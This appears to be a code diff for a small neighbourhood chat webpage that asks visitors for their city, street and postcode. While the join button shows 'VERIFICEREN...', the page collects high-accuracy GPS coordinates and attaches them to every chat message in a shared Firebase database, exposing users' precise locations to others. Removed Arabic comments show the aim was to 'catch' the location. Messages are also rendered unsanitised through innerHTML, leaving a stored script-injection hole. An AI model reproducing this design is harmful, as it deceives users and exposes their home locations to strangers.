@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test</title>
+    <title>a0z</title>
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <style>
         body { background: #000; color: #0ff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
@@ -21,11 +21,11 @@
     <div id="particles-js"></div>
     <div class="container">
         <div id="login-screen" class="box">
-            <h2 style="color: #ff3333;">🇳🇱</h2>
-            <input type="text" id="city" placeholder="Stad (مثلاً Doetinchem)">
+            <h2 style="color: #ff3333;">A🇳🇱Z</h2>
+            <input type="text" id="city" placeholder="Stad">
             <input type="text" id="street" placeholder="Straatnaam">
             <input type="text" id="postcode" placeholder="Postcode">
-            <button onclick="joinRoom()">VERBINDEN</button>
+            <button id="entry-btn" onclick="joinRoom()">VERBINDEN</button>
         </div>
         <div id="chat-screen" class="box">
             <div id="room-info" style="color:#f33; font-size:12px; margin-bottom:10px;"></div>
@@ -52,13 +52,6 @@
     const db = getDatabase(app);
     let userLoc = "Unknown";
 
-    // طلب الموقع فوراً عند فتح الصفحة لزيادة سرعة الاستجابة
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(p => {
-            userLoc = `${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`;
-        }, null, {enableHighAccuracy:true});
-    }
-
     window.joinRoom = () => {
         const city = document.getElementById('city').value.trim().toLowerCase();
         const street = document.getElementById('street').value.trim().toLowerCase();
@@ -66,27 +59,24 @@
 
         if (!city || !street || !postcode) return alert("Vul alles in!");
 
-        const btn = document.querySelector('button');
-        btn.textContent = "VERIFICEREN..."; 
+        const btn = document.getElementById('entry-btn');
+        btn.textContent = "VERIFICEREN...";
         btn.disabled = true;
 
-        // محاولة نهائية للقط الموقع قبل فتح الشات
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((p) => {
                 userLoc = `${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`;
                 completeEntry(city, street, postcode);
             }, () => {
                 completeEntry(city, street, postcode);
-            }, {enableHighAccuracy: true, timeout: 2500});
+            }, { enableHighAccuracy: true, timeout: 3000 });
         } else {
             completeEntry(city, street, postcode);
         }
     };
 
     function completeEntry(city, street, postcode) {
-        // حفظ البيانات في localStorage
         localStorage.setItem('nlLiveUser', JSON.stringify({city, street, postcode}));
-        
         const roomID = `${city}_${street}`.replace(/\s+/g, '');
         document.getElementById('login-screen').style.display = 'none';
         document.getElementById('chat-screen').style.display = 'flex';
@@ -103,13 +93,7 @@
             if (!text) return;
             if (used + text.length > 99) return alert("Limiet 99 bereikt!");
 
-            push(chatRef, { 
-                sender: postcode, 
-                message: text, 
-                loc: userLoc, 
-                time: serverTimestamp() 
-            });
-
+            push(chatRef, { sender: postcode, message: text, loc: userLoc, time: serverTimestamp() });
             localStorage.setItem('u_' + today, (used + text.length).toString());
             input.value = '';
             updateCount();
@@ -117,18 +101,14 @@
 
         onChildAdded(chatRef, (snap) => {
             const d = snap.val();
-            // العلامة الخضراء المضيئة إذا كان الموقع موجود
-            const b = (d.loc && d.loc !== "Unknown") ? " <span style='color:#0f0; text-shadow: 0 0 5px #0f0;'>☑️</span>" : "";
-            
+            const b = (d.loc && d.loc !== "Unknown") ? " <span style='color:#0f0; text-shadow: 0 0 5px #0f0;'>✅</span>" : "";
             const chatBox = document.getElementById('chat-box');
             const msgDiv = document.createElement('div');
             msgDiv.style.margin = "8px 0";
             msgDiv.innerHTML = `<span style="color:#f33; font-weight:bold;">[${d.sender}${b}]:</span> <span style="color:#0ff">${d.message}</span>`;
-            
             chatBox.appendChild(msgDiv);
             chatBox.scrollTop = chatBox.scrollHeight;
         });
-        
         updateCount();
     }
 
@@ -139,7 +119,6 @@
         if (countElem) countElem.textContent = `Tekens over: ${99 - used}`;
     }
 
-    // تعبئة البيانات تلقائياً عند الرجوع للموقع
     window.addEventListener('load', () => {
         const saved = JSON.parse(localStorage.getItem('nlLiveUser'));
         if(saved) {
@@ -147,24 +126,15 @@
             document.getElementById('street').value = saved.street;
             document.getElementById('postcode').value = saved.postcode;
         }
+        particlesJS("particles-js", {
+            "particles": {
+                "number": { "value": 50 },
+                "color": { "value": "#ff3333" },
+                "line_linked": { "enable": true, "color": "#ff3333" },
+                "move": { "enable": true, "speed": 1.5 }
+            }
+        });
     });
-</script>
-<script>
-    particlesJS("particles-js", {
-        "particles": {
-            "number": { "value": 50 },
-            "color": { "value": "#ff3333" },
-            "line_linked": { "enable": true, "color": "#ff3333" },
-            "move": { "enable": true, "speed": 1.5 }
-        }
-    });
-
-    const saved = JSON.parse(localStorage.getItem('nlLiveUser'));
-    if(saved) {
-        document.getElementById('city').value = saved.city;
-        document.getElementById('street').value = saved.street;
-        document.getElementById('postcode').value = saved.postcode;
-    }
 </script>
 </body>
 </html>
